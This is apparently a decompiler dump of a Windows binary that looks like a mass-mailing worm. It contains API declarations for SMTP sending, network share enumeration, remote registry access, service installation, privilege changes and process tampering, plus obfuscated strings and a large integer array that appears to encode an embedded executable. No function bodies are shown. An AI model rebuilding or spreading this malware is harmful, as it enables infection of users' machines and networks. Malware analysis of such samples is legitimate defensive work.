/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __cdecl sub_401000(int, int, int, int);
LSTATUS sub_401198();
int __stdcall sub_401284(HKEY hKey, LPCSTR lpSubKey); // idb
int sub_4013A9();
int __stdcall sub_4013FA(DWORD th32ProcessID, int); // idb
void __stdcall __noreturn sub_4015FF(LPVOID lpThreadParameter);
void *__thiscall sub_40174B(void *this);
LPVOID __thiscall sub_40174E(int this, LPCSTR lpFileName, int, int);
HANDLE __thiscall sub_401808(int this);
char *__cdecl sub_401841(char *Destination);
int __cdecl sub_4018E9(int);
char *__cdecl sub_401A1E(char *Destination);
char *__cdecl sub_401DC4(int, int, char *Destination);
char *__cdecl sub_4021CE(int, char *Source);
char *__cdecl sub_4022DB(char *, char *Destination);
char *__cdecl sub_40260D(char *Destination, char *Source, int);
DWORD __cdecl sub_402642(_DWORD *a1);
int __cdecl sub_40280F(LPCSTR lpMachineName, char *Source, SC_HANDLE hSCObject, HKEY phkResult, int, int); // idb
int __thiscall sub_402BF1(void *this, char *Source, int, size_t Size, int);
int __thiscall sub_402CC3(int this);
int __thiscall sub_402D28(int this);
int __thiscall sub_402D84(int this, char *buf, int len);
int __thiscall sub_402E96(SOCKET *this);
int __thiscall sub_402F50(SOCKET *this, char *Source);
int __thiscall sub_402FEA(SOCKET *this, SOCKET);
char *__thiscall sub_403075(char *this, char *Source);
char *__thiscall sub_40308A(int this, char *Source);
char *__thiscall sub_403133(void *this, char *Source);
BOOL __thiscall sub_4031D8(SOCKET *this, int, __int16, int);
int __thiscall sub_403222(SOCKET *this, char *, int hostshort);
int __thiscall sub_403285(SOCKET *this, char *buf, int len, int flags);
int __thiscall sub_40329C(SOCKET *this, char *buf, int len, int flags);
int __thiscall sub_4032B3(SOCKET *this);
int sub_4032C1();
int __stdcall sub_4032C5(char *name, int); // idb
char __stdcall sub_403357(int, int);
int __cdecl sub_4033AA(char *Destination, char *Source, int, int); // idb
char *__cdecl sub_403434(char *Str, int);
int __cdecl sub_403464(char *Str, int); // idb
_BYTE *__cdecl sub_403496(int);
int __cdecl sub_4034CD(int, int, char *);
int __cdecl sub_403529(int, int, char *);
unsigned int __cdecl sub_403585(int);
int __cdecl sub_403624(_BYTE *, int, int, int);
int __cdecl sub_403678(char);
int __cdecl sub_4036AE(char);
BOOL __cdecl sub_403703(BYTE *);
BOOL __cdecl sub_403724(_BYTE *);
int __cdecl sub_403739(int, char *, int, int, int, int, int); // idb
BOOL __cdecl sub_403944(LPCSTR lpFileName, char *Destination, int, int, int);
int __cdecl sub_403AAD(int, int, char *Destination); // idb
int __cdecl sub_403B18(char);
int __cdecl sub_403B72(char);
char *__cdecl sub_403B7D(char *Source, char *);
char *__cdecl sub_403BD8(char *Destination, int);
int __cdecl sub_403C01(char *Str); // idb
int __cdecl sub_403C40(char *FullPath); // idb
int __cdecl sub_403CBB(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite); // idb
DWORD __cdecl sub_403D0B(LPCSTR lpFileName);
int __cdecl sub_403D58(LPCSTR lpFileName); // idb
char *__cdecl sub_403D8C(LPSTR lpTempFileName);
BOOL __cdecl sub_403DFA(LPCSTR lpFileName);
int __cdecl sub_403E11(char *Source, int, int); // idb
int __cdecl sub_403F63(LPCSTR lpFileName, LONG lDistanceToMove); // idb
BOOL __cdecl sub_40402D(LPCSTR lpFileName, LPFILETIME lpCreationTime);
BOOL __cdecl sub_404075(LPCSTR lpFileName, FILETIME *lpCreationTime);
LPVOID __cdecl sub_4040BD(LPCSTR lpFileName, int, int);
char *__cdecl sub_404156(char *Destination, int, char *, int);
int __cdecl sub_4042C9(int, int, void *, size_t Size, int); // idb
int __cdecl sub_404426(LPCSTR lpFileName, char *Destination, int, int); // idb
int __cdecl sub_4044C0(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData, HKEY phkResult); // idb
int __cdecl sub_40451C(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, BYTE *lpData); // idb
int __cdecl sub_404562(HKEY hKey, LPCSTR lpSubKey, int, int); // idb
int __cdecl sub_4045E0(HKEY hKey, LPCSTR lpSubKey, int, int); // idb
int __cdecl sub_404687(int);
HANDLE __cdecl sub_4046B3(LPCSTR lpApplicationName, LPSTR lpCommandLine);
const char *__cdecl sub_4046F6(LPCSTR lpFileName);
int __cdecl sub_404769(HKEY hKey, char *Source, LPCSTR lpValueName, int, int); // idb
int __cdecl sub_4047FD(HKEY hKey, char *Source, char *, int, int); // idb
int sub_4048CB();
__int16 *__cdecl sub_404A28(__int16 *, __int16);
int __cdecl sub_404A85(int, char *Destination, char *); // idb
BOOL sub_404AFC();
unsigned int __cdecl sub_404B78(int, unsigned int);
_DWORD *__cdecl sub_404BB7(int, unsigned int, unsigned int);
int __cdecl sub_404C27(int, int, int, unsigned int, unsigned int);
int __cdecl sub_404CCD(LPCSTR, LPCSTR lpFileName, int); // idb
int __cdecl sub_404E60(LPCSTR lpFileName, int); // idb
unsigned int __cdecl sub_404F50(_WORD *, unsigned int);
_WORD *__cdecl sub_404FA3(LPCSTR lpFileName);
int __cdecl sub_40500E(LPCCH lpMultiByteStr); // idb
__int16 __cdecl sub_405059(unsigned __int8 *, int);
int __cdecl sub_4050C1(LPCSTR lpFileName, LPCVOID lpBuffer, char *Source, int); // idb
int sub_4052B4();
int __cdecl sub_4052D3(HANDLE ProcessHandle, LPCSTR lpName); // idb
int sub_4053AC();
const char *__cdecl sub_4054B3(LPCSTR lpFileName, char *Str);
HMODULE sub_40556C();
int __cdecl sub_405621(LPCSTR lpFileName); // idb
int __cdecl sub_4058B1(char *FullPath); // idb
int __cdecl sub_4059C2(char *Destination, int); // idb
int __cdecl sub_405A0E(char *FullPath, int); // idb
int __cdecl sub_405BBB(char *FullPath, int, int); // idb
int __cdecl sub_405C5A(char *Source); // idb
int __cdecl sub_405C9C(int, char *Source, char *, int); // idb
void __stdcall __noreturn sub_405DFA(LPVOID lpThreadParameter);
BOOL __cdecl sub_405E42(char *Source, int, int);
int __stdcall sub_405E9A(int);
int __cdecl sub_405F54(char *Str, char *Destination); // idb
BOOL __cdecl sub_405F9F(char *, char *Str, int);
DWORD __stdcall sub_406083(LPVOID lpThreadParameter); // idb
const char *__cdecl sub_40644E(LPCCH lpMultiByteStr, int);
int __cdecl sub_406688(LPNETRESOURCEA lpNetResource, DWORD dwScope, int); // idb
void __stdcall __noreturn sub_406801(LPVOID lpThreadParameter);
int sub_406820();
DWORD __stdcall sub_4069A4(LPVOID lpThreadParameter); // idb
DWORD __stdcall sub_4069F1(LPVOID lpThreadParameter); // idb
const char *__cdecl sub_406A68(LPCSTR lpFileName, int, int, int);
int __cdecl sub_406BDF(LPCSTR lpFileName, int); // idb
DWORD __stdcall StartAddress(LPVOID lpThreadParameter); // idb
int sub_406D5E();
void __noreturn sub_406D75();
DWORD __stdcall sub_406DFB(LPVOID lpThreadParameter); // idb
void __noreturn sub_406F1C();
void __stdcall HandlerProc(DWORD dwControl); // idb
void __stdcall sub_406FED(int, int);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
unsigned int *__cdecl sub_407087(int, size_t, int);
_BYTE *__cdecl sub_407196(int *, unsigned int, size_t *);
// BOOL __stdcall Module32First(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// int __cdecl strcmp(const char *Str1, const char *Str2);
// void *__cdecl memset(void *, int Val, size_t Size);
// char *__cdecl strcpy(char *Destination, const char *Source);
// char *__cdecl strcat(char *Destination, const char *Source);
// size_t __cdecl strlen(const char *Str);
// void __cdecl _splitpath(const char *FullPath, char *Drive, char *Dir, char *Filename, char *Ext);
// int __cdecl toupper(int C);
// int __cdecl tolower(int C);
// int sprintf(char *const Buffer, const char *const Format, ...);
// void __cdecl operator delete(void *Block); idb
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
int __cdecl sub_407B55(int);
// int __cdecl rand();
// void *__cdecl operator new(size_t Size); idb
// int sscanf(const char *const Buffer, const char *const Format, ...);
// void *__cdecl memcpy_0(void *, const void *Src, size_t Size);
// int __cdecl isalpha(int C);
// int __cdecl isdigit(int C);
// char *__cdecl strstr(const char *Str, const char *SubStr);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
int sub_40BFCB();
// _DWORD __cdecl flsall(_DWORD); weak
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);
// DWORD __stdcall WNetEnumResourceA(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetOpenEnumA(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEA lpNetResource, LPHANDLE lphEnum);
// char *__cdecl _strupr(char *String);
// int __cdecl _strnicmp(const char *String1, const char *String2, size_t MaxCount);
// int __cdecl _strcmpi(const char *String1, const char *String2);
// char *__cdecl _strlwr(char *String);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *StartServiceCtrlDispatcherA)(const SERVICE_TABLE_ENTRYA *lpServiceStartTable);
// extern BOOL (__stdcall *LookupPrivilegeValueA)(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
// extern BOOL (__stdcall *AdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// extern LSTATUS (__stdcall *RegCreateKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern BOOL (__stdcall *StartServiceA)(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);
// extern LSTATUS (__stdcall *RegConnectRegistryA)(LPCSTR lpMachineName, HKEY hKey, PHKEY phkResult);
// extern BOOL (__stdcall *OpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// extern BOOL (__stdcall *GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// extern BOOL (__stdcall *AllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid);
// extern BOOL (__stdcall *EqualSid)(PSID pSid1, PSID pSid2);
// extern PVOID (__stdcall *FreeSid)(PSID pSid);
// extern SERVICE_STATUS_HANDLE (__stdcall *RegisterServiceCtrlHandlerA)(LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc);
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *SetServiceStatus)(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern SC_HANDLE (__stdcall *CreateServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern LSTATUS (__stdcall *RegEnumValueA)(HKEY hKey, DWORD dwIndex, LPSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// extern LSTATUS (__stdcall *RegDeleteValueA)(HKEY hKey, LPCSTR lpValueName);
// extern LSTATUS (__stdcall *RegOpenKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// extern LSTATUS (__stdcall *RegEnumKeyA)(HKEY hKey, DWORD dwIndex, LPSTR lpName, DWORD cchName);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern BOOL (__stdcall *CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// extern BOOL (__stdcall *IsDBCSLeadByte)(BYTE TestChar);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern UINT (__stdcall *GetTempFileNameA)(LPCSTR lpPathName, LPCSTR lpPrefixString, UINT uUnique, LPSTR lpTempFileName);
// extern DWORD (__stdcall *GetTempPathA)(DWORD nBufferLength, LPSTR lpBuffer);
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern BOOL (__stdcall *SetFileAttributesA)(LPCSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// extern HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// extern BOOL (__stdcall *SetEndOfFile)(HANDLE hFile);
// extern DWORD (__stdcall *SetFilePointer)(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern BOOL (__stdcall *SetFileTime)(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime);
// extern DWORD (__stdcall *GetTickCount)();
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern UINT (__stdcall *GetSystemDirectoryA)(LPSTR lpBuffer, UINT uSize);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern DWORD (__stdcall *GetVersion)();
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern DWORD (__stdcall *ExpandEnvironmentStringsA)(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern DWORD (__stdcall *GetLastError)();
// extern void (__stdcall *GetLocalTime)(LPSYSTEMTIME lpSystemTime);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern HANDLE (__stdcall *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// extern LPVOID (__stdcall *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern BOOL (__stdcall *ReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *GetFileTime)(HANDLE hFile, LPFILETIME lpCreationTime, LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime);
// extern struct hostent *(__stdcall *gethostbyname)(const char *name);
// extern int (__stdcall *closesocket)(SOCKET s);
// extern int (__stdcall *WSACleanup)();
// extern int (__stdcall *send)(SOCKET s, const char *buf, int len, int flags);
// extern u_short (__stdcall *htons)(u_short hostshort);
// extern int (__stdcall *connect)(SOCKET s, const struct sockaddr *name, int namelen);
// extern int (__stdcall *WSAGetLastError)();
// extern int (__stdcall *WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
// extern SOCKET (__stdcall *socket)(int af, int type, int protocol);
// extern int (__stdcall *recv)(SOCKET s, char *buf, int len, int flags);
int dword_40D1E8[4] = { 0, 5, 0, 7 }; // weak
int dword_40D1FC[5] = { 5, 2, 2, 2, 2 }; // weak
_UNKNOWN unk_40D210; // weak
_UNKNOWN unk_40D220; // weak
void *off_40E030 = &unk_40FD0F; // weak
char Str2[2] = "@"; // idb
char asc_40E038[2] = " "; // idb
char asc_40E03C[2] = ","; // idb
char asc_40E040[3] = "--"; // idb
char asc_40E044[2] = "\\"; // idb
char buf[] = "QUIT\r\n"; // idb
char asc_40E050[] = "\r\n.\r\n"; // idb
char aData[] = "DATA \r\n"; // idb
char asc_40E06C[] = ">\r\n"; // idb
char aMailFrom[] = "MAIL FROM: <"; // idb
char aRcptTo[] = "RCPT TO:<"; // idb
char asc_40E090[] = " \t\r\n"; // idb
char asc_40E098[] = ".,()%$@!`~ "; // idb
char asc_40E0A8[] = ".."; // idb
char asc_40E0AC[] = "."; // idb
char asc_40E0B0[] = "\\*.*"; // idb
char asc_40E0B8[] = "\\\\"; // idb
char String1 = '‰'; // idb
char byte_40E0D0[4] = { '\x01', 'Ô', '\x8F', '›' }; // weak
char a4[3] = "4:°"; // idb
char aO[] = "Ô"; // idb
char byte_40F1D8 = '\x0E'; // idb
char byte_40F1DC = 'ˆ'; // idb
char byte_40F1FC = 'ˆ'; // idb
char SubKey[2] = "r\n"; // idb
char aD_1[1] = "D"; // idb
char byte_40F346 = '\x16'; // idb
char asc_40F396[1] = "\b"; // idb
char byte_40F3E2 = '\x04'; // idb
char aR_4[2] = "r&"; // idb
char aX0[3] = "X0\n"; // idb
char Format[1] = "|"; // idb
char aR_3[1] = "R"; // idb
char aD_0[1] = "D"; // idb
char byte_40F752 = '¬'; // idb
char aIao42[7] = "ÎÀÔ4\n2<"; // idb
char aZ[1] = "z"; // idb
CHAR ValueName[1] = "F"; // idb
char aNfnZx[6] = "NFN^Žx"; // idb
char aR_0[4] = "R\n\b<"; // idb
char byte_40F82B = '¬'; // idb
char aR_1[4] = "R\n\b<"; // idb
char byte_40F89D = '\x16'; // idb
char aIa[2] = "ÎÀ"; // idb
char asc_40F90F[1] = "|"; // idb
char aJfrvot0[8] = "JFRvÔt0\n"; // idb
char a2[1] = "2"; // idb
char aJvxt[4] = "jVxt"; // idb
char aVhFzxfp[8] = "VH|FŽxFp"; // idb
CHAR LibFileName[1] = "r"; // idb
char aR_2[1] = "r"; // idb
CHAR ProcName[1] = "p"; // idb
char aDtljpPornnzpo[15] = "^dtLJp^pÔRNNZpÔ"; // idb
char aT0[3] = "t0\n"; // idb
char aZ2[2] = "ž2"; // idb
char a2_0[1] = "2"; // idb
_UNKNOWN unk_40FD88; // weak
char String2 = 'ˆ'; // idb
CHAR asc_40FDA4[1] = ":"; // idb
char asc_40FDCC[1] = "\\"; // idb
char Name[1] = "r"; // idb
char asc_40FE08[1] = ":"; // idb
int dword_40FF80 = 1; // weak
int dword_40FF84[1089] =
{
  17,
  27,
  34,
  120,
  136,
  373,
  12,
  389,
  28,
  421,
  83,
  526,
  14,
  566,
  14,
  606,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  6243,
  414,
  6668,
  500,
  10857,
  276,
  11236,
  1180,
  5265997,
  2,
  983044,
  65535,
  184,
  0,
  18481216,
  280625152,
  -1273033216,
  -1205744375,
  567102465,
  1750372496,
  1881174889,
  1919381362,
  1830841697,
  544502645,
  1914725730,
  1965059701,
  1919247470,
  1852397344,
  168636979,
  1162884900,
  21757952,
  731709444,
  34820,
  0,
  14680064,
  17531278,
  33560834,
  335544320,
  0,
  1107820544,
  1073741824,
  536870912,
  0,
  268435520,
  33554432,
  65536,
  0,
  196608,
  10,
  1610612736,
  67108864,
  0,
  131072,
  0,
  536870928,
  0,
  268435472,
  0,
  806354944,
  1080295424,
  1125122048,
  4539471,
  0,
  16,
  16,
  2,
  8198,
  1413563488,
  65,
  1048576,
  2097152,
  1048576,
  1074266112,
  784334848,
  1952539753,
  97,
  16,
  48,
  2,
  16408,
  1701981888,
  6516588,
  1310720,
  4194304,
  1212416,
  1612316672,
  1760559104,
  200,
  2024,
  -402626048,
  6,
  808723967,
  637468736,
  675295288,
  3162160,
  1311781888,
  1442840624,
  48,
  1308622848,
  1442840624,
  48,
  1258291200,
  1162760773,
  775041868,
  7105636,
  1392508928,
  1885693292,
  1157627904,
  1349806456,
  1701015410,
  1078131,
  4096,
  422580992,
  4507696,
  1459795968,
  3598417,
  -1742798848,
  1405784171,
  676006019,
  -1621670283,
  856882906,
  775580561,
  752133831,
  1053497786,
  -1771490899,
  984172612,
  983089026,
  -1123002000,
  -1969225452,
  -1874153010,
  -1923023779,
  -1167699083,
  -1963195818,
  1106345998,
  -2132295232,
  243825905,
  1967810118,
  -1742020626,
  -397921364,
  -1096330951,
  -1142296255,
  1014737233,
  -1179010655,
  1403173305,
  851318094,
  1136138709,
  -1297639289,
  -1179010576,
  -1330470381,
  431602107,
  1910195825,
  28244906,
  2126172657,
  1186576825,
  -1179042118,
  -1166689861,
  1393370063,
  -1052791202,
  -1166721345,
  1395857865,
  -1757850506,
  -1367715335,
  1052723513,
  -1079961170,
  802011678,
  1394941235,
  -1320306138,
  -572579533,
  -1502530477,
  -1375007813,
  1589639513,
  1589630382,
  -2056446753,
  433003275,
  -917435511,
  1746484507,
  -1179010692,
  -1576303251,
  -1178907966,
  1968980665,
  2085816806,
  1236151581,
  -1488011279,
  -1374187050,
  1321173321,
  -1080651346,
  -1567577570,
  -1179010226,
  981207821,
  963446025,
  -1181107863,
  -1046425927,
  -1192707655,
  2117779281,
  -1184030785,
  -1119907258,
  -1566393927,
  -1179010211,
  -1567221477,
  502248219,
  954155197,
  -538023720,
  -807867336,
  1076221607,
  95299823,
  -1202143416,
  -262240398,
  1420779182,
  1556065617,
  -1371527762,
  1852721157,
  -559800561,
  -1179009719,
  -898284370,
  -773804114,
  1983395899,
  2095858129,
  -1490835374,
  -1466096728,
  859083555,
  1052395655,
  -1179009620,
  -1184334266,
  163166649,
  -1187001117,
  -1715883079,
  2017900985,
  -1179010712,
  -1197340231,
  1179010070,
  -248402407,
  -927422823,
  -541476423,
  1830633016,
  -532673210,
  -1856948051,
  -1445455651,
  -1252037606,
  -1090560838,
  675570377,
  1986944083,
  1363021212,
  1214784126,
  950414216,
  -482923345,
  -78518977,
  856829655,
  -265709942,
  1258088661,
  168172692,
  -1574633621,
  -1558818868,
  522600041,
  87378202,
  -462078690,
  38135512,
  617835152,
  1113028161,
  139949810,
  -1671993165,
  -1269336347,
  -1621658064,
  -1185450814,
  -1967539783,
  -1453885704,
  2119660693,
  1079473208,
  -2074642767,
  2002220547,
  -329812475,
  -1923647836,
  1951888979,
  -1671990129,
  -1168673093,
  -1386776928,
  -682133880,
  -1772652824,
  1431795287,
  -1739098589,
  -296258023,
  -1806207455,
  2136438463,
  2086106699,
  -1923647807,
  1717008059,
  -682133858,
  -1185450272,
  -1179010632,
  -1179010631,
  4688057,
  178176,
  -1179010816,
  -1656337991,
  -714948935,
  55980974,
  866785555,
  -1584249129,
  -1346782787,
  -1560325320,
  -1180489790,
  928309177,
  2124928167,
  -1840900159,
  -1179009623,
  -1655490385,
  -1544912222,
  1322236345,
  1409919327,
  55785776,
  -2023195282,
  934918577,
  2124928167,
  420944156,
  -1112436154,
  -1330988615,
  -1180319790,
  1848969657,
  997788026,
  -1179049624,
  -492143687,
  -1179015681,
  1371025492,
  723205017,
  -1986902501,
  330938813,
  -1178904216,
  320541113,
  -1320844638,
  455063993,
  1368540699,
  1421457853,
  1362741555,
  2064584631,
  -1180615623,
  -1194773676,
  -248404465,
  -1118602367,
  -1724090298,
  -1318511687,
  -1564886597,
  -1182675502,
  -1840900679,
  -1179009559,
  1750513173,
  -1179009132,
  1528234440,
  -1305153937,
  -1179009066,
  -1079744325,
  -439830087,
  1400064371,
  1910884513,
  -1305190047,
  -1179009066,
  954199741,
  2114651628,
  -919382801,
  2045989689,
  -1179551384,
  1769712057,
  -1179012679,
  -1510489438,
  420985273,
  -1115581882,
  -1183991367,
  -1840900331,
  -1179009647,
  -1311807367,
  2075900345,
  -882374891,
  1371126207,
  -1146001137,
  1830271417,
  1756982715,
  -1179010639,
  -1188095209,
  -446164711,
  532265401,
  1464956263,
  24337787,
  1568631587,
  1969708903,
  1796669777,
  1466397029,
  1396638047,
  1702059357,
  1567823185,
  1701276511,
  1699945729,
  -1178768967,
  -1840858951,
  -1179015745,
  -1514696122,
  2037299641,
  -1178881687,
  -1121425223,
  1723775417,
  -1150478409,
  -1553417875,
  1002027449,
  1697339737,
  822563179,
  -1184947935,
  1013453081,
  524699206,
  1464956263,
  24337787,
  1568631587,
  1969708903,
  1796669777,
  1466397029,
  287701343,
  1565736705,
  1365603165,
  1599959829,
  23422827,
  1902471959,
  -1184934041,
  1073939262,
  -1146003270,
  -1305167431,
  -1179012321,
  716322496,
  -1229342285,
  -1404680634,
  978635043,
  882594104,
  -1179443278,
  -1305036359,
  -1179012310,
  1179010623,
  -1028762962,
  -1179015681,
  1371028052,
  -1413912447,
  850311609,
  2092447471,
  -1321420617,
  1797051559,
  -1182452452,
  1461243833,
  1398198191,
  960123989,
  -2123449007,
  -1182452278,
  -1514036551,
  454160478,
  1166320149,
  532265393,
  -1840899301,
  -1179009711,
  -1180056984,
  -1455663943,
  1012172113,
  1748849073,
  -1179010616,
  1777455522,
  -1179010127,
  -376289771,
  1757002173,
  -1179010772,
  -1179023768,
  -1449629511,
  -1166689863,
  -1479980724,
  4868272,
  178176,
  -1178997760,
  -1143707463,
  -1252935239,
  952709972,
  954185553,
  -1178870168,
  1757441721,
  -1179010735,
  1777451426,
  -1179010127,
  1186557207,
  -1178762862,
  -1145542471,
  -633161287,
  1543624774,
  926171364,
  1600698811,
  1757002169,
  -1179010775,
  -1180054680,
  1020569529,
  -1179021878,
  -1487252295,
  1018826964,
  -1179005573,
  -1359900246,
  -1840901814,
  -1179009551,
  -1077860690,
  -1312707747,
  -815221929,
  -1397114439,
  944042417,
  -1118483007,
  -1314358312,
  1778941169,
  1179010623,
  -1840901883,
  -1179009543,
  -1242480200,
  -1399630941,
  -1044516559,
  -1045343809,
  883643307,
  -1179279694,
  -1871824455,
  -1569098682,
  1760686417,
  -1179010692,
  -1179032984,
  -318650183,
  -537989659,
  1622863416,
  -1179010247,
  -2117217630,
  353483193,
  -1109290426,
  -1489389127,
  -1179002192,
